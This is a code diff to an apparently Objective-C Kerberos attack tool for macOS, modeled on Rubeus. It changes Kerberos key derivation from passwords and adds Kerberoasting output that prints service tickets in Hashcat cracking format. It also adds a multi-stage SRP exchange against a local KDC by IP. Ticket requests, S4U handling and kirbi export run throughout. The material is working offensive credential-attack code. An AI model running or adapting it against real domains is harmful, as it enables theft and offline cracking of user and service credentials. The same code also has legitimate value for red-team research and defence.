@@ -301,7 +301,6 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }
     //krb5_cc_store_cred (krb5_context context, krb5_ccache cache, krb5_creds *creds)
     printf("[*] Saving credential for %s\n", [ticket.app29.sname29 getNSString].UTF8String);
-    //this crashes with "storage_set_flags called with bad vno(0)" if the file already exists
     ret = krb5_cc_store_cred(context, cache, &cred);
     if(ret){
         printKrbError(context,ret);
@@ -594,7 +593,7 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }
     return hash;
 }
--(NSString*)genPasswordHashPassword:(NSString*)password  Enc:(int)enc_type Username:(NSString*)username Domain:(NSString*)domain{
+-(NSString*)genPasswordHashPassword:(char*)password Length:(int)password_len Enc:(int)enc_type Username:(NSString*)username Domain:(NSString*)domain Pretty:(Boolean)prettyprint{
     krb5_context context;
     krb5_error_code ret;
     NSString *final_key = @"";
@@ -603,9 +602,9 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         return @"Error getting krb5 context";
     }
     krb5_data data;
-    data.data = (char*)password.UTF8String;
+    data.data = password;
     data.magic = KV5M_KEYBLOCK;
-    data.length =  (uint)password.length;
+    data.length =  password_len;
 
     // to generate the right salt
     //https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/
@@ -618,7 +617,10 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         combined_salt = [combined_salt stringByAppendingString:username];
     }
-    final_key = [final_key stringByAppendingFormat:@"Username: %s\nPassword: %s\nDomain: %s\nSalt: %s\n\nKeys:\n", username.UTF8String, password.UTF8String, domain.UTF8String, combined_salt.UTF8String];
+    if(prettyprint){
+        final_key = [final_key stringByAppendingFormat:@"Username: %s\nPassword: %s\nDomain: %s\nSalt: %s\n\nKeys:\n", username.UTF8String, password, domain.UTF8String, combined_salt.UTF8String];
+    }
+    
     salt.data = (char*)combined_salt.UTF8String;
     salt.magic = KV5M_KEYBLOCK;
     salt.length = (int)combined_salt.length;
@@ -660,11 +662,11 @@ void printKrbError(krb5_context context, krb5_error_code ret){
 -(NSString*)checkAcquireTicketsError:(KLStatus)status {
     if (status == KRB5_KDC_UNREACH) {
         return @"[-] Unable to contact the Kerberos server.";
-    } else if (status == KRB5KDC_ERR_PREAUTH_FAILED) return @"[-] Incorrect username or password.";
+    } else if (status == KRB5KDC_ERR_PREAUTH_FAILED) return @"[-] Incorrect username or password.\n";
     
     NSString *errorMessage = [self getKerberosErrorMessage:status];
-    printf("[-] Error acquiring tickets: %d: %s", status, errorMessage.UTF8String);
-    return [[NSString alloc] initWithFormat:@"[-] Error acquiring tickets: %@.", errorMessage];
+    //printf("[-] Error acquiring tickets: %d: %s", status, errorMessage.UTF8String);
+    return [[NSString alloc] initWithFormat:@"[-] Error acquiring tickets: %@.\n", errorMessage];
 }
 -(NSString*)getTGTUsername:(NSString*)usernameToUse Password:(NSString*)passwordToUse Domain:(NSString*)domainToUse{
     KLPrincipal principal;
@@ -698,19 +700,20 @@ void printKrbError(krb5_context context, krb5_error_code ret){
         KLDisposePrincipal(principal);
     } else {
         KLDisposePrincipal(principal);
-        printf("[-] %s\n", [self checkAcquireTicketsError:status].UTF8String);
+        printf("%s\n", [self checkAcquireTicketsError:status].UTF8String);
         return NULL;
     }
-    return [[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.", usernameToUse];
+    return [[NSString alloc] initWithFormat:@"[+] Successfully obtained Kerberos ticket for principal %@.\n", usernameToUse];
 }
 -(NSString*)askTGTConnectDomain:(NSString*)connectDomain EncType:(int)enctype Hash:(NSString*)hash Username:(NSString*)username Domain:(NSString*)domain SupportAll:(bool)supportAll TgtEnctype:(int)tgtEnctype{
     //returns a base64 Kirbi version of the TGT
     kdc* kerbdc = [kdc alloc];
+    
+    NSData* test = createASREQ(enctype, hash, username, domain, supportAll, tgtEnctype, [NSMutableArray arrayWithObjects: [NSNumber numberWithInt:2], [NSNumber numberWithInt:149], nil], NULL);
     int result = [kerbdc connectDomain:domain.UTF8String];
     if(result == -1){
         return NULL;
     }
-    NSData* test = createASREQ(enctype, hash, username, domain, supportAll, tgtEnctype);
     result = [kerbdc sendBytes:test];
     if(result == -1){
         return NULL;
@@ -770,8 +773,13 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         printf("[+] Successfully received TGSREP\n");
     }
-    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
+    Krb5Ticket sTicket = parseTGSREP(holder, TGT, kerberoasting);
     if(sTicket.app29 != NULL){
+        if( kerberoasting){
+            //From Rubeus: string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
+            NSString* octetvalues = sTicket.app1.encdata.getHexValue;
+            printf("[+] Hashcat format:\n$krb5tgs$%d$*$%s$%s*$%s$%s\n", sTicket.app1.enctype.KerbIntValue,sTicket.app1.realm.KerbGenStringvalue.UTF8String, [sTicket.app1.sname getNSString].UTF8String, [octetvalues substringToIndex:32].UTF8String, [octetvalues substringFromIndex:32].UTF8String);
+        }
         printf("[*] Describing ticket\n");
         printf("%s\n", describeTicket(sTicket).UTF8String);
         printf("[*] Creating Kirbi:\n");
@@ -811,7 +819,7 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         printf("[+] Successfully received response\n");
     }
-    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
+    Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
     if(sTicket.app29 != NULL){
         //we got a TGS back, now adjust it to be what we actually wanted
         printf("[*] Describing ticket\n");
@@ -851,7 +859,7 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         printf("[+] Successfully received response\n");
     }
-    Krb5Ticket s4uTicket = parseTGSREP(holder, TGT);
+    Krb5Ticket s4uTicket = parseTGSREP(holder, TGT, false);
     if(s4uTicket.app29 != NULL){
         printf("[*] Describing ticket\n");
         printf("%s\n", describeTicket(s4uTicket).UTF8String);
@@ -892,7 +900,7 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         printf("[+] Successfully received response\n");
     }
-    Krb5Ticket sTicket = parseTGSREP(holder, TGT);
+    Krb5Ticket sTicket = parseTGSREP(holder, TGT, false);
     if(sTicket.app29 != NULL){
         //we got a TGS back, now adjust it to be what we actually wanted
         printf("[*] Describing ticket\n");
@@ -905,5 +913,111 @@ void printKrbError(krb5_context context, krb5_error_code ret){
     }else{
         return NULL;
     }
+}
+-(NSString*)askTGTLKDCByIP:(NSString*)IP EncType:(int)enctype Password:(NSString*)password Username:(NSString*)username Domain:(NSString*)domain SupportAll:(bool)supportAll TgtEnctype:(int)tgtEnctype{
+    printf("[*] Starting process for getting TGT for user: %s\n", username.UTF8String);
+    kdc* krbdc = [kdc alloc];
+    SRPClient* srp = [SRPClient alloc];
+    int result = [krbdc connectLKDCByIP: IP.UTF8String];
+    if(result == -1){
+        return NULL;
+    }
+    // now to start the back-and-forth process with the LKDC at the end of the IP specified
+    // Step 1: Application 10 AS-REQ with domain of WELLKNOWN:COM.APPLE.LKDC to get remote KDC Realm
+    NSData* LKDC_Stage1_Req = LKDC_Stage1_GetRemoteRealm(username);
+    //printf("Stage 1 Req: %s\n", [LKDC_Stage1_Req base64EncodedStringWithOptions:0].UTF8String);
+    result = [krbdc sendBytes:LKDC_Stage1_Req];
+    if(result == -1){
+        return NULL;
+    }
+    else{
+        printf("[+] Successfully sent request for remote LKDC realm\n");
+    }
+    NSData* holder = [krbdc recvBytes];
+    if(holder == NULL){
+        printf("[-] Failed to get response from remote LKDC\n");
+        return NULL;
+    }
+    else{
+        printf("[+] Received response from LKDC\n");
+    }
+    NSData* LKDC_Stage1_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
+    //printf("Stage 1 Rep: %s\n", [LKDC_Stage1_Rep base64EncodedStringWithOptions:0].UTF8String);
+    NSString* remoteRealm = LKDC_Stage1_ParseASREPForRemoteRealm(LKDC_Stage1_Rep);
+    if(remoteRealm != NULL){
+        printf("[+] Remote realm is: %s\n", remoteRealm.UTF8String);
+    }else{
+        printf("[-] Failed to get remote realm from KDC\n");
+        return NULL;
+    }
+    // Step 2: Application 10 AS-REQ with real domain
+    NSData* LKDC_Stage2_Req = LKDC_Stage2_GetPADATAInfo(remoteRealm, username);
+    result = [krbdc sendBytes:LKDC_Stage2_Req];
+    if(result == -1){
+        return NULL;
+    }
+    else{
+        printf("[+] Successfully sent request for SRP user salt information\n");
+    }
+    holder = [krbdc recvBytes];
+    if(holder == NULL){
+        printf("[-] Failed to get response from remote LKDC\n");
+        return NULL;
+    }
+    else{
+        printf("[+] Received response from LKDC\n");
+    }
+    NSData* LKDC_Stage2_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
+    //printf("Stage 2 Rep: %s\n", [LKDC_Stage2_Rep base64EncodedStringWithOptions:0].UTF8String);
+    NSArray* Sequence133And250 = LKDC_Stage2_ParseASREPForPADATAInfo(LKDC_Stage2_Rep, srp, username, password);
+    if( Sequence133And250 == NULL){
+        return NULL;
+    }
+    // Step 3: Application 10 AS-REQ with cookie, srp bytes A, and real realm
+    NSData* LKDC_Stage3_Req = LKDC_Stage3_GetPADATAInfo(remoteRealm, username, Sequence133And250);
+    //printf("Stage 3 Req: %s\n", [LKDC_Stage3_Req base64EncodedStringWithOptions:0].UTF8String);
+    result = [krbdc sendBytes:LKDC_Stage3_Req];
+    if(result == -1){
+        return NULL;
+    }
+    else{
+        printf("[+] Successfully sent SRP public client A value\n");
+    }
+    holder = [krbdc recvBytes];
+    if(holder == NULL){
+        printf("[-] Failed to get response from remote LKDC\n");
+        return NULL;
+    }
+    else{
+        printf("[+] Received response from LKDC\n");
+    }
+    NSData* LKDC_Stage3_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
+    //printf("Stage 3 Rep: %s\n", [LKDC_Stage3_Rep base64EncodedStringWithOptions:0].UTF8String);
+    NSArray* Sequence133And250Stage3 = LKDC_Stage3_ParseASREPForPADATAInfo(LKDC_Stage3_Rep, srp);
+    if( Sequence133And250Stage3 == NULL){return NULL;}
+    // Step 4: Application 10 AS-REQ with cookie, srp bytes M, and real realm
+    NSData* LKDC_Stage4_Req = LKDC_Stage4_GetPADATAInfo(remoteRealm, username, Sequence133And250Stage3);
+    printf("Stage 4 req: %s\n", [LKDC_Stage4_Req base64EncodedStringWithOptions:0].UTF8String);
+    result = [krbdc sendBytes:LKDC_Stage4_Req];
+    if(result == -1){
+        return NULL;
+    }
+    else{
+        printf("[+] Successfully sent SRP public generated M value\n");
+    }
+    holder = [krbdc recvBytes];
+    if(holder == NULL){
+        printf("[-] Failed to get response from remote LKDC\n");
+        return NULL;
+    }
+    else{
+        printf("[+] Received response from LKDC\n");
+    }
+    NSData* LKDC_Stage4_Rep = [[NSData alloc] initWithBytes:(Byte*)holder.bytes length: holder.length];
+    printf("Stage 4 rep: %s\n", [LKDC_Stage4_Rep base64EncodedStringWithOptions:0].UTF8String);
+    // Should get an error with "Need to use PA-ENC-TIMESTAMP/PA-PK-AS-REQ
+    LKDC_Stage4_ParseASREPForPADATAInfo(LKDC_Stage4_Rep, srp);
+     
+    return NULL;
 }
 @end
